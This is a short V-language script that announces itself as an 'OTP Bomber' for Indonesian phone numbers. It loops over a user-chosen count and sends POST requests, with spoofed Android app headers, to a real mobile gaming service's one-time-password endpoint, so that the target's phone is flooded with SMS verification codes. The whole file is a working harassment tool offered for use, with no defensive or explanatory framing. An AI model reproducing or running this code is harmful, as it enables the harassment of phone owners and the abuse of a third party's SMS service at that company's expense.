import net.http
import os

fn otp(nomor string, thr int) ? {
    payload := '{"countryCode":62,"mobileNumber":"' + nomor + '","referrerCode":"","signUpOfferCode":"","imei":{"imei1":"","imei2":""},"gameId":1000002,"ivbb":"","userUid":"a0861be9-9c71-44ae-b9a2-6a63b8edba48"}'
    mut req := http.Request{url: 'https://global-api.mpl.live/auth/init/otp', method: http.Method.post, data: payload}
    req.add_custom_header('apptype', 'Cash')?
    req.add_custom_header('language', 'in')?
    req.add_custom_header('countrycode', 'ID')?
    req.add_custom_header('versionname', '1.0.153_MPL_Production_ID_nowtm')?
    req.add_custom_header('content-type', 'application/json; charset=utf-8')?
    req.add_custom_header('apktype', 'INDO_IA_NWTM_MISSIONS')?
    req.add_custom_header('user-agent', 'mpl-android/1000153 (RV-153)')?
    req.do()?
    println("[SUCCESS] Thread Number: $thr ($nomor)")
}

fn main()  {
    println("OTP Bomber for Indonesian Number (+62)")
    println("Example: 8992226185")
    mut nomor := os.input("Phone Number: ")
    mut thread := os.input("Thread: ").int()
    for j := 0;j < thread;j++ {
        otp(nomor, j)?
    }

}
